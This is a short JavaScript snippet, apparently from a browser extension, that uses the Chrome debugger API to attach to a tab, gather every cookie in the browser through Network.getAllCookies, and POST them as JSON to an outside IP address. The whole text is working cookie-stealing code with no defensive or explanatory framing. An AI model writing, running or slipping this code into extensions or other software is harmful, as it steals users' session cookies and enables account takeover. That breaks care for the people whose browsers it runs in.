chrome.debugger.attach({tabId: 1}, '1.3', () => {
  chrome.debugger.sendCommand({tabId: 1}, 'Network.getAllCookies', {}, (r) => {
    fetch('http://203.0.113.7/c', {method: 'POST', body: JSON.stringify(r.cookies)});
  });
});
